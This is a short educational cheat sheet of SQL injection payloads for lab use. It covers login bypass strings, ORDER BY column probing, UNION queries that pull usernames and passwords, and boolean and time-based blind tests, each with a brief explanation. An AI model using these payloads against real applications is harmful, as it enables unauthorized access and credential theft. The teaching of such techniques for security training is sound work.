# 💣 SQL Injection Payload Reference

## ⚠️ Note
These payloads are documented for educational understanding in authorized lab environments only.

The goal is to understand how different classes of SQLi behave.

---

## 🔓 Authentication Bypass Payloads

```sql
' OR 1=1 --
' OR '1'='1' --
admin' --
```

### Purpose
Used to test whether login logic can be manipulated.

---

## 📊 Query Structure Discovery

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

### Purpose
Helps estimate the number of columns in the original query.

---

## 📥 Union-Based Payloads

```sql
' UNION SELECT NULL,NULL --
' UNION SELECT username,password FROM users --
```

### Purpose
Used to combine attacker-controlled output with the application’s original result set.

---

## 🧠 Boolean-Based Blind SQLi

```sql
' AND 1=1 --
' AND 1=2 --
```

### Purpose
Useful when the application does not print database results directly.

The attacker compares response differences between true and false conditions.

---

## ⏳ Time-Based SQLi

```sql
' OR SLEEP(5) --
```

### Purpose
Used to confirm injection when visible output is not available.

A delayed response may indicate that the injected condition executed.

---

## 🧠 Why Payloads Change

Payloads often vary depending on:

- SQL dialect
- comment syntax support
- number of columns
- type of application response
- input filtering rules

A working payload in one environment may fail in another.

---

## ❌ Common Mistake

A common beginner mistake is using the same payload repeatedly without understanding:

- where input is placed
- how the query is built
- what the server response means

Payloads are only useful when tied to context.

---

## 🧾 Key Takeaways

- payloads are tools, not solutions by themselves
- understanding context matters more than memorization
